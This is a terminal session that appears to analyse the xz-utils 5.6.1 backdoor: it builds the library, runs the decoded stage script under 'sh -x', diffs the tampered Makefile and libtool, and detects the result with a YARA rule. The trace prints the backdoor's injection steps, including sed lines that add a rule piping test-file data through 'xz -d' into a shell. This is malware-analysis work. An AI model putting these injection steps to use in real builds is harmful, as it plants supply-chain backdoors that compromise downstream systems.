root@ubuntu:~/xz/# apt update
root@ubuntu:~/xz/# apt install -y gcc g++ vim net-tools make cmake build-essential libncurses-dev flex bison libssl-dev libelf-dev bc liblz4-tool liblz4-dev liblzma-dev
...
...
root@ubuntu:~/xz/# bash ./decode.sh
root@ubuntu:~/xz/# tar xf xz-5.6.1.tar.xz && cd xz-5.6.1
root@ubuntu:~/xz/xz-5.6.1# ./configure
...
...
root@ubuntu:~/xz/xz-5.6.1# make
...
...
root@ubuntu:~/xz/xz-5.6.1# cp -rf src/liblzma/.libs/liblzma.so.5.6.1 ../liblzma.so.5.6.1.o
root@ubuntu:~/xz/xz-5.6.1# cp -rf src/liblzma/Makefile ../Makefile.o
root@ubuntu:~/xz/xz-5.6.1# cp -rf libtool ../libtool.o
root@ubuntu:~/xz/xz-5.6.1# cat ../good-large_compressed.lzma.de.txt | RPM_ARCH=x86_64 sh -x
+ P=-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections
+ C=pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
+ O=^pic_flag=" -fPIC -DPIC"$
+ R=is_arch_extension_supported
+ x=__get_cpuid(
+ p=good-large_compressed.lzma
+ U=bad-3-corrupt_lzma2.xz
+ uname
+ [ ! Linux=Linux ]
+ eval
+ test -f config.status
+ eval
+ grep ^LD='/ config.status
+ eval LD='/usr/bin/ld -m elf_x86_64'
+ LD=/usr/bin/ld -m elf_x86_64
+ grep ^CC=' config.status
+ eval CC='gcc'
+ CC=gcc
+ grep ^GCC=' config.status
+ eval GCC='yes'
+ GCC=yes
+ grep ^srcdir=' config.status
+ eval srcdir='.'
+ srcdir=.
+ grep ^build='x86_64 config.status
+ eval build='x86_64-pc-linux-gnu'
+ build=x86_64-pc-linux-gnu
+ grep ^enable_shared='yes' config.status
+ eval enable_shared='yes'
+ enable_shared=yes
+ grep ^enable_static=' config.status
+ eval enable_static='yes'
+ enable_static=yes
+ grep ^gl_path_map=' config.status
+ eval gl_path_map='tr "\t \-_" " \t_\-"'
+ gl_path_map=tr "\t \-_" " \t_\-"
+ grep -broaF ~!:_ W ./tests/files/
+ vs=
+ test x != x
+ eval
+ grep -qs \["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1" config.status
+ grep -qs define HAVE_FUNC_ATTRIBUTE_IFUNC 1 config.h
+ test xyes != xyes
+ echo x86_64-pc-linux-gnu
+ grep -Eq ^x86_64
+ grep -qs is_arch_extension_supported() ./src/liblzma/check/crc64_fast.c
+ grep -qs is_arch_extension_supported() ./src/liblzma/check/crc32_fast.c
+ grep -qs is_arch_extension_supported ./src/liblzma/check/crc_x86_clmul.h
+ grep -qs __get_cpuid( ./src/liblzma/check/crc_x86_clmul.h
+ test xyes != xyes
+ test xgcc != xgcc
+ LDv=/usr/bin/ld -m elf_x86_64 -v
+ /usr/bin/ld -m elf_x86_64 -v
+ grep -qs GNU ld
+ test -f ./tests/files/good-large_compressed.lzma
+ test -f ./tests/files/bad-3-corrupt_lzma2.xz
+ test -f ./debian/rules
+ test xx86_64 = xx86_64
+ eval
+ j=^ACLOCAL_M4 = $(top_srcdir)\/aclocal.m4
+ grep -qs ^ACLOCAL_M4 = $(top_srcdir)\/aclocal.m4 src/liblzma/Makefile
+ z=^am__uninstall_files_from_dir = {
+ grep -qs ^am__uninstall_files_from_dir = { src/liblzma/Makefile
+ w=^am__install_max =
+ grep -qs ^am__install_max = src/liblzma/Makefile
+ E=^am__uninstall_files_from_dir = {
+ grep -qs ^am__uninstall_files_from_dir = { src/liblzma/Makefile
+ Q=^am__vpath_adj_setup =
+ grep -qs ^am__vpath_adj_setup = src/liblzma/Makefile
+ M=^am__include = include
+ grep -qs ^am__include = include src/liblzma/Makefile
+ L=^all: all-recursive$
+ grep -qs ^all: all-recursive$ src/liblzma/Makefile
+ m=^LTLIBRARIES = $(lib_LTLIBRARIES)
+ grep -qs ^LTLIBRARIES = $(lib_LTLIBRARIES) src/liblzma/Makefile
+ u=AM_V_CCLD = $(am__v_CCLD_$(V))
+ grep -qs AM_V_CCLD = $(am__v_CCLD_$(V)) src/liblzma/Makefile
+ grep -qs ^pic_flag=" -fPIC -DPIC"$ libtool
+ eval
+ b=am__test = bad-3-corrupt_lzma2.xz
+ sed -i /^ACLOCAL_M4 = $(top_srcdir)\/aclocal.m4/iam__test = bad-3-corrupt_lzma2.xz src/liblzma/Makefile
+ echo tr "\t \-_" " \t_\-"
+ sed s/\\/\\\\/g
+ d=tr "         \\-_" "        _\\-"
+ b=am__strip_prefix = tr "      \\-_" "        _\\-"
+ sed -i /^am__install_max =/iam__strip_prefix = tr "    \\-_" "        _\\-" src/liblzma/Makefile
+ b=am__dist_setup = $(am__strip_prefix) | xz -d 2>/dev/null | $(SHELL)
+ sed -i /^am__uninstall_files_from_dir = {/iam__dist_setup = $(am__strip_prefix) | xz -d 2>/dev/null | $(SHELL) src/liblzma/Makefile
+ b=$(top_srcdir)/tests/files/$(am__test)
+ s=am__test_dir=$(top_srcdir)/tests/files/$(am__test)
+ sed -i /^am__vpath_adj_setup =/iam__test_dir=$(top_srcdir)/tests/files/$(am__test) src/liblzma/Makefile
+ h=-Wl,--sort-section=name,-X
+ echo
+ grep -qs -e -z,now -e -z -Wl,now
+ h=-Wl,--sort-section=name,-X,-z,now
+ j=liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X,-z,now
+ sed -i /^all: all-recursive$/iliblzma_la_LDFLAGS += -Wl,--sort-section=name,-X,-z,now src/liblzma/Makefile
+ sed -i s/^pic_flag=" -fPIC -DPIC"$/pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"/g libtool
+ k=AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))
+ sed -i s/AM_V_CCLD = $(am__v_CCLD_$(V))/AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))/ src/liblzma/Makefile
+ l=LTDEPS='$(lib_LTDEPS)'; \\\n    export top_srcdir='$(top_srcdir)'; \\\n    export CC='$(CC)'; \\\n    export DEFS='$(DEFS)'; \\\n    export DEFAULT_INCLUDES='$(DEFAULT_INCLUDES)'; \\\n    export INCLUDES='$(INCLUDES)'; \\\n    export liblzma_la_CPPFLAGS='$(liblzma_la_CPPFLAGS)'; \\\n    export CPPFLAGS='$(CPPFLAGS)'; \\\n    export AM_CFLAGS='$(AM_CFLAGS)'; \\\n    export CFLAGS='$(CFLAGS)'; \\\n    export AM_V_CCLD='$(am__v_CCLD_$(V))'; \\\n    export liblzma_la_LINK='$(liblzma_la_LINK)'; \\\n    export libdir='$(libdir)'; \\\n    export liblzma_la_OBJECTS='$(liblzma_la_OBJECTS)'; \\\n    export liblzma_la_LIBADD='$(liblzma_la_LIBADD)'; \\\nsed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
+ sed -i /^LTLIBRARIES = $(lib_LTLIBRARIES)/iLTDEPS='$(lib_LTDEPS)'; \\\n    export top_srcdir='$(top_srcdir)'; \\\n    export CC='$(CC)'; \\\n    export DEFS='$(DEFS)'; \\\n    export DEFAULT_INCLUDES='$(DEFAULT_INCLUDES)'; \\\n    export INCLUDES='$(INCLUDES)'; \\\n    export liblzma_la_CPPFLAGS='$(liblzma_la_CPPFLAGS)'; \\\n    export CPPFLAGS='$(CPPFLAGS)'; \\\n    export AM_CFLAGS='$(AM_CFLAGS)'; \\\n    export CFLAGS='$(CFLAGS)'; \\\n    export AM_V_CCLD='$(am__v_CCLD_$(V))'; \\\n    export liblzma_la_LINK='$(liblzma_la_LINK)'; \\\n    export libdir='$(libdir)'; \\\n    export liblzma_la_OBJECTS='$(liblzma_la_OBJECTS)'; \\\n    export liblzma_la_LIBADD='$(liblzma_la_LIBADD)'; \\\nsed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1 src/liblzma/Makefile
+ eval
+ eval
root@ubuntu:~/xz/xz-5.6.1# cp -rf src/liblzma/Makefile ../Makefile.m
root@ubuntu:~/xz/xz-5.6.1# cp -rf libtool ../libtool.m
root@ubuntu:~/xz/xz-5.6.1# make clean && make
...
...
root@ubuntu:~/xz/xz-5.6.1# cp -rf src/liblzma/.libs/liblzma.so.5.6.1 ../liblzma.so.5.6.1.m
root@ubuntu:~/xz# git diff libtool.o libtool.m > libtool.diff
root@ubuntu:~/xz# git diff Makefile.o Makefile.m > Makefile.diff
root@ubuntu:~/xz# git diff crc32_fast.c.o crc32_fast.c.m > crc32_fast.c.diff
root@ubuntu:~/xz# git diff crc64_fast.c.o crc64_fast.c.m > crc64_fast.c.diff
root@ubuntu:~/xz# yara xz_backdoor_check.yara .
sshd_liblzma_vulnerability_check ./liblzma_la-crc64-fast.o
sshd_liblzma_vulnerability_check ./liblzma_la-crc64_fast.o
sshd_liblzma_vulnerability_check ./liblzma.so.5.6.1.m
root@ubuntu:~/xz# exit
